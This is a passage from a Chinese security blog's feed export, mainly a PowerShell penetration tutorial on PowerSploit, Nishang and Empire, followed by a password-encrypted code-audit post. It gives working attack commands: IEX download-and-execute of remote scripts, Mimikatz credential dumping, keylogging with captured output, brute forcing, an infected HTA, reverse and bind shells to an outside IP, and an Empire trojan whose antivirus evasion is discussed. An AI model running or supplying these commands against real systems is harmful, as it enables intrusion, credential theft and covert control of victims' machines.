get-process notepad</span><br><span class="line"></span><br><span class="line">Handles  NPM(K)    PM(K)      WS(K) VM(M)   CPU(s)     Id ProcessName</span><br><span class="line">-------  ------    -----      ----- -----   ------     -- -----------</span><br><span class="line">     56       7     1424       5300    75     0.00   2008 notepad</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PS C:<span class="symbol">\U</span>sers<span class="symbol">\z</span>n&gt; Invoke-DllInjection -ProcessID 2008 -Dll C:<span class="symbol">\U</span>sers<span class="symbol">\z</span>n<span class="symbol">\t</span>est.dll #先将文件下载到此处</span><br><span class="line">You cannot inject a 32-bit DLL into a 64-bit process.</span><br></pre></td></tr></table></figure><h4 id="Invoke-Portscan"><a href="#Invoke-Portscan" class="headerlink" title="Invoke-Portscan"></a>Invoke-Portscan</h4><p>nvoke-Portscan是Recon模块下的一个脚本，主要用于端口扫描，使用起来也比较简单。使用方法如下</p><p>先下载脚本，然后进行扫描</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PS <span class="string">C:</span>\&gt; IEX (New-Object Net.WebClient).DownloadString(<span class="string">"http://192.168.157.139/PowerSploit/Recon/Invoke-Portscan.ps1"</span>)</span><br><span class="line"></span><br><span class="line">PS <span class="string">C:</span>\&gt; Invoke-Portscan -Hosts <span class="number">192.168</span><span class="number">.157</span><span class="number">.138</span> -Ports <span class="string">"80,22,3389"</span></span><br></pre></td></tr></table></figure><h4 id="Invoke-Mimikatz"><a href="#Invoke-Mimikatz" class="headerlink" title="Invoke-Mimikatz"></a>Invoke-Mimikatz</h4><p>Invoke-Mimikatz是Exfiltration模块下的一个脚本。使用方法如下</p><p>先下载脚本，然后执行命令即可</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS <span class="string">C:</span>\&gt; IEX (New-Object Net.WebClient).DownloadString(<span class="string">"http://192.168.157.139/PowerSploit/Exfiltration/Invoke-Mimikatz.ps1"</span>)</span><br><span class="line">PS <span class="string">C:</span>\&gt; Invoke-Mimikatz -DumpCreds</span><br></pre></td></tr></table></figure><p>这里需要注意一点，和使用Mimikatz工具一样，内置的Mimikatz在使用时同样需要管理员权限。</p><h4 id="Get-Keystrokes"><a href="#Get-Keystrokes" class="headerlink" title="Get-Keystrokes"></a>Get-Keystrokes</h4><p>Get-Keystrokes是Exfiltration模块下的一个脚本，用于键盘记录，功能相当强大，不仅有键盘输入记录，甚至能记录鼠标的点击情况，还能记录详细的时间，实战时可以直接放入后台运行。使用方法如下。</p><p>先下载脚本，然后使用命令开启键盘记录，这里输入几个字母测试一下。</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">PS C:<span class="string">\&gt;</span> IEX (New-Object Net.WebClient).DownloadString(<span class="string">"http://192.168.157.139/PowerSploit/Exfiltration/Get-Keystrokes.ps1</span></span><br><span class="line"><span class="string">"</span>)</span><br><span class="line"></span><br><span class="line">PS C:<span class="string">\&gt;</span> Get-Keystrokes -LogPath C:<span class="string">\Users\zn\test1.txt</span></span><br><span class="line">PS C:<span class="string">\&gt;</span> sdfsadadads</span><br><span class="line"> </span><br><span class="line">打开test1.txt查看：</span><br><span class="line"><span class="string">"TypedKey"</span>,<span class="string">"WindowTitle"</span>,<span class="string">"Time"</span></span><br><span class="line"><span class="string">"s"</span>,<span class="string">"Windows PowerShell"</span>,<span class="string">"2020/1/16 18:57:13"</span></span><br><span class="line"><span class="string">"d"</span>,<span class="string">"Windows PowerShell"</span>,<span class="string">"2020/1/16 18:57:13"</span></span><br><span class="line"><span class="string">"f"</span>,<span class="string">"Windows PowerShell"</span>,<span class="string">"2020/1/16 18:57:13"</span></span><br><span class="line"><span class="string">"s"</span>,<span class="string">"Windows PowerShell"</span>,<span class="string">"2020/1/16 18:57:13"</span></span><br><span class="line"><span class="string">"a"</span>,<span class="string">"Windows PowerShell"</span>,<span class="string">"2020/1/16 18:57:13"</span></span><br><span class="line"><span class="string">"d"</span>,<span class="string">"Windows PowerShell"</span>,<span class="string">"2020/1/16 18:57:13"</span></span><br><span class="line"><span class="string">"a"</span>,<span class="string">"Windows PowerShell"</span>,<span class="string">"2020/1/16 18:57:14"</span></span><br><span class="line"><span class="string">"d"</span>,<span class="string">"Windows PowerShell"</span>,<span class="string">"2020/1/16 18:57:14"</span></span><br><span class="line"><span class="string">"a"</span>,<span class="string">"Windows PowerShell"</span>,<span class="string">"2020/1/16 18:57:14"</span></span><br><span class="line"><span class="string">"d"</span>,<span class="string">"Windows PowerShell"</span>,<span class="string">"2020/1/16 18:57:14"</span></span><br><span class="line"><span class="string">"s"</span>,<span class="string">"Windows PowerShell"</span>,<span class="string">"2020/1/16 18:57:14"</span></span><br><span class="line"><span class="string">"d"</span>,<span class="string">"C:\Users\zn\test1.txt - Notepad++"</span>,<span class="string">"2020/1/16 18:57:45"</span></span><br><span class="line"><span class="string">"a"</span>,<span class="string">"*C:\Users\zn\test1.txt - Notepad++"</span>,<span class="string">"2020/1/16 18:57:45"</span></span><br><span class="line"><span class="string">"s"</span>,<span class="string">"*C:\Users\zn\test1.txt - Notepad++"</span>,<span class="string">"2020/1/16 18:57:45"</span></span><br></pre></td></tr></table></figure><h4 id="PowerUp"><a href="#PowerUp" class="headerlink" title="PowerUp"></a>PowerUp</h4><p>主要来介绍PowerUp模块，powerUp拥有众多用来寻找目标主机的Windows服务漏洞进行提权的实用脚本，先下载脚本：</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">IEX</span> (New-Object Net.WebClient)<span class="selector-class">.DownloadString</span>(<span class="string">"http://192.168.157.139/PowerSploit/Privesc/PowerUp.ps1"</span>)</span><br></pre></td></tr></table></figure><p><img src="1344396-20181223213723305-325093325.png" alt="img"></p><p>1.<strong>Invoke-AllChecks</strong></p><p>该模块会自动执行PowerUp下所有模块来检查目的主机：</p><p><img src="1344396-20181223213939733-173322209.png" alt="img"></p><p>2.<strong>Find-PathDLLHijack</strong></p><p>该模块用于检查当前%PATH%的哪些目录是用户可以写入的：</p><p><img src="1344396-20181223214157646-1940987848.png" alt="img"></p><p>3.<strong>Get-ServiceDetail</strong></p><p>该模块用于返回某服务的信息：</p><p><img src="1344396-20181223214527227-1884968775.png" alt="img"></p><h3 id="Powershell渗透框架nishang"><a href="#Powershell渗透框架nishang" class="headerlink" title="Powershell渗透框架nishang"></a>Powershell渗透框架nishang</h3><h4 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h4><p>​        Nishang是一个PowerShell脚本和有效载荷的框架和集合，它使PowerShell能够用于攻击安全性、渗透测试和红队。它是基于PowerShell的渗透测试专用工具，集成了框架、脚本和各种Payload，包括下载和执行、键盘记录、DNS、延时命令等脚本，被广泛用于渗透测试的各个阶段。Nishang在PowerShell3.0及以上的环境中才能正常使用，所以Windows7、Server2008下默认是有点小问题的。</p><p>项目地址：<a href="https://github.com/samratashok/nishang" target="_blank" rel="noopener">https://github.com/samratashok/nishang</a></p><p><img src="20191208151623232.png" alt=""></p><h5 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h5><ul><li>ActiveDirectory：活动目录</li><li>Antak-WebShell：WebShell</li><li>Backdoors：后门</li><li>Bypass：绕过</li><li>Client：客户端</li><li>Escalation：提权</li><li>Execution：执行</li><li>Gather：信息收集</li><li>MITM：</li><li>Misc：发音</li><li>Pivot：跳板、远程执行exe</li><li>Prasadhak：Virustotal </li><li>Scan：扫描</li><li>Shells：shell</li><li>Utility：杂项</li><li>Powerpreter：Meterpreter会话</li></ul><h4 id="Nishang使用姿势"><a href="#Nishang使用姿势" class="headerlink" title="Nishang使用姿势"></a>Nishang使用姿势</h4><p>导入所有的脚本到当前的PowerShell会话中(PowerShell v3之前)</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Import</span>-<span class="keyword">Module</span> -verbose  .\nishang.psm1</span><br></pre></td></tr></table></figure><p><img src="QQ%E6%88%AA%E5%9B%BE20200720162040.png" alt=""></p><p>然后输入命令：<code>Get-Command -Module nishang</code></p><p>查看nishang有哪些功能</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200720162317.png" alt=""></p><h4 id="nishang常用脚本"><a href="#nishang常用脚本" class="headerlink" title="nishang常用脚本"></a>nishang常用脚本</h4><p>​    Nishang基本上包含了渗透测试各个阶段的脚本，在扫描阶段，它也有两个很实用的脚本暴力破解和端口扫描。</p><h5 id="1-暴力破解-（Invoke-BruteForce"><a href="#1-暴力破解-（Invoke-BruteForce" class="headerlink" title="1.暴力破解 （Invoke-BruteForce)"></a>1.暴力破解 （Invoke-BruteForce)</h5><p>Invoke-BruteForce是Nishang中一个专注于暴力破解的脚本，它可以破解SQL Server、ActiveDirecotry、FTP、Web等服务。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">Invoke-BruteForce</span> <span class="selector-tag">-ComputerName</span> <span class="selector-tag">SQLServ01</span> <span class="selector-tag">-UserList</span> <span class="selector-tag">C</span><span class="selector-pseudo">:testusername.txt</span> <span class="selector-tag">-PasswordList</span> <span class="selector-tag">C</span><span class="selector-pseudo">:testpassword.txt</span> <span class="selector-tag">-Service</span> <span class="selector-tag">SQL</span> <span class="selector-tag">-Verbose</span></span><br></pre></td></tr></table></figure><h5 id="2-端口扫描"><a href="#2-端口扫描" class="headerlink" title="2.端口扫描"></a>2.端口扫描</h5><p>Invoke-PortScan是Nishang中一个端口扫描脚本，它可以发现主机、解析主机名、端口扫描，是实战中一个很实用的脚本。</p><p>参数介绍：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-StartAddress &lt;<span class="keyword">String</span>&gt;起始IP-EndAddress &lt;<span class="keyword">String</span>&gt;终止IP-ResolveHost 加上这个参数，解析主机名。-ScanPort 加上这个参数，扫描端口-Ports 指定扫描的端口</span><br></pre></td></tr></table></figure><p>发现存活主机，解析主机名、扫描80端口是否开放。</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke -StartAddress <span class="number">192.168</span><span class="number">.110</span><span class="number">.1</span> -EndAddress <span class="number">192.168</span><span class="number">.110</span><span class="number">.130</span> -ResolveHost -ScanPort -Ports <span class="number">80</span></span><br></pre></td></tr></table></figure><h5 id="3-下载文件"><a href="#3-下载文件" class="headerlink" title="3.下载文件"></a>3.下载文件</h5><p>​    Download_Execute是Nishang中一个下载执行脚本，它在实战中最常用的功能就是下载一个文本文件，然后将其转换为可执行文件执行。</p><p>用实例：</p><p>第一步：首先我们需要使用Nishang中的exetotext.ps1脚本将可执行文件更改为文本文件。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">PS</span> <span class="selector-tag">C</span><span class="selector-pseudo">:Usersroot</span>&gt; <span class="selector-tag">ExetoText</span> <span class="selector-tag">c</span>:\<span class="selector-tag">powershellmsf</span><span class="selector-class">.exe</span> <span class="selector-tag">c</span>:\<span class="selector-tag">powershellmsf</span><span class="selector-class">.txt</span> <span class="selector-tag">Converted</span> <span class="selector-tag">file</span> <span class="selector-tag">written</span> <span class="selector-tag">to</span> <span class="selector-tag">c</span>:\<span class="selector-tag">powershellmsf</span><span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure><p>第二步：使用Download_Execute下载执行文本文件</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS <span class="string">C:</span>Usersroot&gt; Download_Execute <span class="string">http:</span><span class="comment">//192.168.110.128/msf.txt</span></span><br></pre></td></tr></table></figure><p>使用实例：</p><p>第一步：首先我们需要使用Nishang中的exetotext.ps1脚本将可执行文件更改为文本文件。</p><h5 id="4-信息收集"><a href="#4-信息收集" class="headerlink" title="4.信息收集"></a>4.信息收集</h5><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> Check-VM 这是Nishang中检测目标机是否为虚拟机的脚本。</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> Copy-VSS 使用卷影拷贝服务来复制SAM文件。</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span> Get-Information 从目标机上获取有价值信息的脚本</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span> Get-PassHashes 从目标机上获取Hash密码的脚本。</span><br><span class="line"></span><br><span class="line"><span class="number">5.</span> Get-WLAN-Keys 从目标机上获取纯文本的WLAN密钥。</span><br><span class="line"></span><br><span class="line"><span class="number">6.</span> Keylogger 键盘记录脚本，大家应该都熟悉。</span><br><span class="line"></span><br><span class="line"><span class="number">7.</span> Invoke-Mimikatz 在内存中加载Mimikatz，Mimikatz大家都熟悉吧，不作介绍了。</span><br></pre></td></tr></table></figure><h5 id="5-后门利用"><a href="#5-后门利用" class="headerlink" title="5.后门利用"></a>5.后门利用</h5><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> HTTP-Backdoor 可以接收来自第三方网站的指令，并在内存中执行PowerShell脚本。</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> DNS_TXT_Pwnage 可以在DNS TXT查询中接收指令和PowerShell脚本，并在目标机上执行。</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span> Execute-OnTime 可以在目标机上指定时间执行PowerShell脚本。</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span> Gupt-Backdoor 可以从WLAN SSID中接收命令和脚本，而不用去连接它。</span><br></pre></td></tr></table></figure><h5 id="6-客户端攻击"><a href="#6-客户端攻击" class="headerlink" title="6.客户端攻击"></a>6.客户端攻击</h5><p>​        Nishang中还有生成各种危害文件的脚本，它们可以生成各种感染的文件，如HTA、Word，来执行powershell脚本。可以神不知鬼不觉的发动攻击，由于各个脚本用法相同，这里以生成受感染的HTA为例子。</p><p><strong>Out-HTA</strong></p><p>功能：创建受感染的HTA文件，可以执行PowerShell命令和脚本。</p><p>用法实例：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:<span class="symbol">\n</span>ishang-master&gt; Out-HTA -PayloadScript C:<span class="symbol">\n</span>ishang-master<span class="symbol">\S</span>hells<span class="symbol">\I</span>nvoke-PowerShellTcpOneLine.ps1 -HTAFilePath C:<span class="symbol">\H</span>ACKER.HTA</span><br></pre></td></tr></table></figure><p>第一步：我们先来创建受感染的HTA文件。在下图中我们可以发现成功生成了一个受感染的HTA文件hacker.hta</p><p>第二步：先使用nc来监听端口，然后运行受感染的HTA文件，可以发现成功反弹Shell</p><h5 id="7-powershell交互式shell"><a href="#7-powershell交互式shell" class="headerlink" title="7.powershell交互式shell"></a>7.powershell交互式shell</h5><h5 id="基于TCP协议的Powershell交互式shell"><a href="#基于TCP协议的Powershell交互式shell" class="headerlink" title="基于TCP协议的Powershell交互式shell"></a>基于TCP协议的Powershell交互式shell</h5><p>Invoke-PowerShellTcp是PowerShell交互式正向连接或反向连接shell，基于TCP协议</p><p><strong>1.正向连接</strong></p><p>目标机运行</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke-powershelltcp -bind -port <span class="number">86</span></span><br></pre></td></tr></table></figure><p>本地nc连接到目标机端口86</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200720163135.png" alt=""></p><p><strong>2.反向连接</strong></p><p>第一步：使用nc监听本地端口86（注意必须先监听，不然在目标机上执行脚本会出错）</p><p>第二步：在目标机上反弹shell</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke-powershelltcp -reverse -ipaddress <span class="number">192.168</span><span class="number">.157</span><span class="number">.138</span> -port <span class="number">86</span></span><br></pre></td></tr></table></figure><p><img src="QQ%E6%88%AA%E5%9B%BE20200720163923.png" alt=""></p><h5 id="基于UDP协议的Powershell交互式shell"><a href="#基于UDP协议的Powershell交互式shell" class="headerlink" title="基于UDP协议的Powershell交互式shell"></a>基于UDP协议的Powershell交互式shell</h5><p>Invoke-PowerShellUdpPowershell交互式正向连接或反向连接shell，基于UDP协议。</p><h5 id="基于HTTP和HTTPS协议的PowerShell交互式Shell"><a href="#基于HTTP和HTTPS协议的PowerShell交互式Shell" class="headerlink" title="基于HTTP和HTTPS协议的PowerShell交互式Shell"></a>基于HTTP和HTTPS协议的PowerShell交互式Shell</h5><p>Invoke-PoshRatHttp and Invoke-PoshRatHttps是Powershell交互式反向连接shell，基于HTTP协议和HTTPS协议。</p><h3 id="Powershell渗透框架empire"><a href="#Powershell渗透框架empire" class="headerlink" title="Powershell渗透框架empire"></a>Powershell渗透框架empire</h3><p>​    empire 是一个针对内网针对域控的一个渗透测试框架，和 msf 类似。其中集成了很多内网的一些工具以及命令，使用方便，且 empire 生成的木马文件基于 powershell，所以在 windows 平台上有很好的免杀效果。结合 msf 使用更是如虎添翼。empire 安装下载命令如下：</p><p>安装后，在其目录执行./empire 文件即可，打开后如下图：</p><p><img src="format,png" alt="请输入图片描述"></p><p>empire 包含三个部分，一个是 modules 即自身的一些模块，一个是 listernes 即监听类似 msf 的 exploit/multi/handler 模块，一个是 agents 即已经链接上的会话类似 msf 存的 session。</p><h4 id="0x01：设置监听"><a href="#0x01：设置监听" class="headerlink" title="0x01：设置监听"></a>0x01：设置监听</h4><p>​        使用 empire 首先设置一个监听，输入 listeners 命令进入监听模块，进入后需要使用监听种类，输入 uselistener 加空格然后两下 tab 可列出所有的可使用监听类，这里我们使用 http，随后输入 info 可查看吃类监听的详细信息，如下图：</p><p><img src="format,png" alt="请输入图片描述"></p><p>​        这里需要设置下 name 参数，随意定义一个名字，例如 test，然后另外还要注意下 host 参数和 prot，即监听使用的 ip 和端口，一般默认即可，就是自己本机的 ip 和 80。设置无误后，通过 execute 执行，如下图：</p><p>ps：listeners 模块下通过 list 命令可查看已经设置的监听。</p><h4 id="0x02：生成木马"><a href="#0x02：生成木马" class="headerlink" title="0x02：生成木马"></a>0x02：生成木马</h4><p>​        设置好监听后通过 back 命令返回上一级，然后使用 usestager 命令来指定生成木马的类型，老规矩，通过空格加两下 tab 可查看所有生成文件的类型，这里我们使用 windows/launcher_bat，即 windows 平台下的 bat 文件，同样，通过 info 查看此模块的详细信息，如下图：</p><p><img src="format.png" alt="请输入图片描述"></p><p>生成的文件类型大体有三类，multi 开头的是通用类，osx 开头即 mac 使用，windows 即 win 平台使用。使用 launcher_bat 模块后，通过 info 我们看到了参数信息，这里需要设置一个 Listener 参数，即监听的名字，就是我们刚才的 test，设置后通过 execute 执行，文件会生成到 tmp 目录下，如下图：</p><p><img src="fghjfghj.jpg" alt="请输入图片描述"></p><p>我们打开这个文件看下，可以看到是 poershell 命令，然后通过 base64 编码，如下图：</p><p><img src="sdfgsdfg.jpg" alt="请输入图片描述"></p><p>这时我们 back 返回监听那一级，然后等待目标执行我们的木马文件就回得到其 shell，这里的 bat 我第一次运行 360 是没报毒，腾讯管家也没有报，火绒有报，第二次 360 报了，其他类型的文件有时会报，有时不报，原因还在看，大家下面可以试试，我们诱导目标机执行后，就会得到它的 shell，如下图：</p><p><img src="gghkghjk.jpg" alt="请输入图片描述"></p><p>这里我可能多点了一下执行力两边，我们通过 agents 就可查看目前得到的 shell，随后通过 interact 加 name 命令即可进入 shell 中，name 就是 shell 随机给的名称，进入后我们通过 help 可查看一些命令和一些提供的内网渗透常用的工具，如下图：</p><p><img src="dfghfgdh.jpg" alt="请输入图片描述"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Powershell渗透学习&quot;&gt;&lt;a href=&quot;#Powershell渗透学习&quot; class=&quot;headerlink&quot; title=&quot;Powershell渗透学习&quot;&gt;&lt;/a&gt;Powershell渗透学习&lt;/h2&gt;&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h3 id=&quot;powe
      
    
    </summary>
    
    
      <category term="内网与域渗透学习" scheme="https://shu1l.github.io/categories/%E5%86%85%E7%BD%91%E4%B8%8E%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="Powershell" scheme="https://shu1l.github.io/tags/Powershell/"/>
    
  </entry>
  
  <entry>
    <title>songcms代码审计</title>
    <link href="https://shu1l.github.io/2020/06/28/songcms-dai-ma-shen-ji/"/>
    <id>https://shu1l.github.io/2020/06/28/songcms-dai-ma-shen-ji/</id>
    <published>2020-06-28T08:52:42.000Z</published>
    <updated>2020-11-25T09:02:09.714Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="b05d2c36b0030d640a5d8bd82da8d968c19d0afa70e7d3c99fd7e65228ef7c2e">e005edcb58d936b244a322ddfeffa6ce7ae2a1c1f03e47d5b6b1c042d0c6bd0ab2cf7e734ae52d6aa441e250f3b5653ec92d95574e0deef8d8b6a3293c63e2e4d6b128e866380a6bef5567999ba3905ae20452aebd3b6859bf842029f117f6648cede300f3b689652f11114e2e15694c940a6dae56ed978f478cb881f3aa8a782fa6e88547b3bb2dec85c4480e2851961cf950ed840f4cb6b8704b374b027c74a6fd91e59002e6d2e583c64e3ed1b30bf1e132e1ea936037369eb56cb1a0e9dac80f7ddfb37f5d311a2b6206d047136836df069a880de6295951bee85079b061f77383b989dc64c017f727d113c4c1eda384ced79bfab3cb4ca2b6046a2aced07c22fb1a968e51a3242a67199e24948d16388df0557d1fdb9b0bcc4ec4acd2e7cf0bfeb76e634ab1552679b86a8c7fb4c6af4b483753691934bebbde987106dd8e9c64f81aee1cf89164f4e8e5180bfbd7bd5f390f17abe0e5d55f987fea706e57713ca91245b1b618fad7db25fd8b3e69695ff6129d06e4b9db638d3a37354024ab828bd5b0896c4acbebb4abeee973223e8d89930327d4ebef1337d2e1e49703059de1863d9b3172f4b71f1f89b9bd600e1535442c5308b05abdb4742f413fef9e4f1a370d2efe769d7e949ea7a55e436d52da3d89aacf1d04e6fc3f55cacc26c451fcf387453f69993ed73ad4f222e39022b52d4590e40a309339609d61ad53f70a92efdbec9f2995cd21bab98f6ab11f7815b1ef4b496025b7d51b090bc59652bb1e14cd0625acc8c0d14e2822c1d2ed450388b731f28f74297bc10bfb72570ffed24759103200274bc90738f2c7aabc8c4dc52557f71af0bd28cce7f6687d82fb225a46cf75568850131b8ffdd76e912c0ee1750e6d13619833c0ee473206f8366fa3f49eb4bbb6561ba2a28aac966d1feb482f621556def79fa80845fa7fe71b14c4b70e6e82aaf5de5fdf702616e52348cb4ad70196df12ff63fc919cb8a97be1405e853b92407b48b9e42318d78c25167617c1e151ee72652eacf12ce114a74f959b7674f05374756bc91a8f689aedf65b9e5607ac8106c838487cf8765866830b8c46d85aa6e56fe36e6fd9210e933a662d836ce69fc446fd49653982be67c163b749ea2ffb4227c8f497c00742a3a1b125f2986b817f6eb41905d6966011e56f5fae0e3768bb84cbc4dc983fb40e30113f6a825ead9d81209f1e24250997db812e8aaa92aa9a9babf37cedaa14a3b6f287ff6ebc97936c902e5c244d577edeada587b025796fcf311e07abf0c7528e367f4cdb22c9dbaf21f033bbcfe81129a575f39170b0e53faa3f1b1c12f017249a83e228234b5906bad62e623f7374164fe851796942154ce18c50cabaa7347d3200366377e20306481fbd7580e92a7e73ecb98a9f0883b6fff9bc7f000b9e2e4b168b9f430bfc95fd4d7b4d6f7527f73d3578fc5c1a36702dd2e4f0b68abf15f3c7865037f7e7bb645992ce0255a1161a4dc61c37b00540757923a49f5310b4c36852e429ad7bd3c9c8f15be2ba952cb25dcdc077ae042a136966299d47bcb9c8f2943504c142b9255df75cb13353d6b40127e021060447699437b384304d2b5414da26e4733c722300edfc0d9a339506f0830d9c3681b9c5215e3ba34b0a7fb454610ba335efa5aa34fb0392e7c520495ef86c4fdaa3c223315711dc132036fb8ad664b2624628e1f6a769258c07ce4dfbd5f5b43c7038be7b4891bde5439a2ecd0a3bdd1951f50038d62089baaead3c7d16ec1cdc2bf6e648f64d88e39ae418ed8f17d82c0301977800554adb1996bfcaec3054b5324d01ff84410c6399b06d00f1213e2cda1b3d0464fc376e95f83ae3148b03e5d56ac50707181470a3cb688c76725d2dc2496a909c4b80bd3cb0d9ea64f473f53ccca4affb4f58cd64343a450a7834c3076c57d8469ab3cf6615ecb0c70fd026b9bc3f691b0f38a8eed2bd25cc52a7653a2cf73c731207cdaf56d48947e593663a9dccc14788ffaa81a73d655b602fa9e142394a4cebbc5cb120f5d556e1ca95660156a4807d875154fd0f599a65e7d8998c29328a5991372aaff14e5eac2f35afce47751d71f6f7df917fd67408189f4dc3b2c3ce30cb564bc9a94ec536ea2f4dc65e78bb4e32f7b4931f73f840a84656c076900aee565eff30a42adeffaac8ac32edf22c2a26e7bbc3cd0ebf57a3c2fe4471a01ed3989bebd823036549ffa4a593d57c0da6e01a8bb20384812a0503a41e187fe45bc8a91414b712b655cf2fc57fcbaceff5d05038057d6cde53a53d8aca03427ca1cb723cfbec63ad48ed73cad0cff756d36bccc5458cff5b91cb205e6b05356c23f17f32b906c289e0489de3227d195609110906f30f72d9727b769d4da277dc966b2d9b68434b796cdac4b15df433342ea2870524125bd370dcd6818a4aa57cadbf9212157b7b1b46bc985deac900b3a42f57f9d90c163ded7128b0d71e38c25410190ad9c68ddf3b4ca6fad8ab65800e8a5a83786caeb27cd01bb6d72f8ced56bb38330d0201b2d4363562d1f4838177a1ef13ff0274cf92a4ce9aeb163513f5bbc503a839581ef434547e759f05fe7692bfdb9622763df43154b3d6acc6e63de6c7a2788efa403a45287633c1d26f76f96759ca3a5d124e17d8e46e8e08696ed21e7cd5564ba5b5445c9f5e2f8d0f88ac9d3a2ce91cf49802c88bb42b78546e7ab6403d7990d2c8329bb210a811a94190b0f5c81f235659cd4ac5555c54d4be3a323d0003113a8d08b07e5a160e8699ce7d8c7f19c257daa49a6f7705ea3a0969c4430c163f9f24ac21494e8a594b951f7c3461cd923ac866985a99f02ab424c310e4332c7de4e6667d888582581b8ed37c286d32eeed4d183fb6e7fbe69103aa1228187a2542739c0db5ee7112307da4c15ad3087bf8c075036f46acf2c7c37fba85651423eb2928a13de7a57211b254a024917a5d917c66b8463670c4a4bad1ceccc301a575fddfca1e3bdbcd33bdb5b7442252e623a64243591a30769cd10cbc3a030d7255ecef137d2f329a0049a957cfb4c8858c7a35d32e9b4c5ba0100a60b20857569dd487d07de447440ee5942b4320b49cf51b3fc6488a82fc603650baabc19f98aac88fbf23cb438746a92482baeb44eac229e56d2348c655d699cef148455a84c68ffa2fd675eaec575bacde8b32f7a85cf97b0a87c19178a42a54f0f4711b313f569d8982b9991a5f0f11d074464e8212e016a6135090632382e9532b56c1fe7d94e6c524d91a8818b63c20846aa34437d69f88510c74a490ad76caf06a59ecb4548b68303d1b2f653f7c33d538231998311321099f98620e934801739a730058a3e2b9abe28c532817d1024032131003713a1f46f75749d2a9a7c513491b25329cca3cb0ab56ddcbe8483ab5bcdcbb0bf27fdef0fde977b9b6333832c64ad816615868fcd8bfafa7fe25fedd1a266ebb98a0098bb3f0003c7fbbffd1667b6c7a755c3afd5082f76a19cd1136a0275077a88619ad5202a49cad2930258f29391895f8cdd8e861ef3b963941746151a0ed850264404eb29bbdc523b7da89655a92becd82098ef4e8f8b1eea93e8f35eaeac46d4c81d99f2cb6b8f8c295228bf38103e7c80c9aae646307af3fddfaa4de4fcf60aa5dad4da8fc11365963513ccd451bd7ffa934ccce2938bafc69047348a0bfcbb72a7f144aece596c72ecceb3647bc2e701d134d067365fc32d40adae341c42407fe75f4df9556bed516e3b1e7eaf27675104044e2ebfba1e2af80b371d12759c3c9ec3a133f45f75a038ce7c362dc1d93c62e2156ae8d63a812ca5a41f61578058a10a2781c6942d58e77b4d04831804c0771a1606bb99c377301f75ad2e6c42a3396a9622e56e246e8df865c226c16fb09bbe3bc39313f95ec7709db8c0bfaa84be343673715fa9808a7b09be9bc6558f29ad4519718c17cd8f63c4b73a44dee7f63f625bcd70bde67f202d483e52793efff5ca9e9265beefec061b79255eab3a9ad12bb1d6263fc63baefedf3fc79a510001b32611aeda59d71d7c7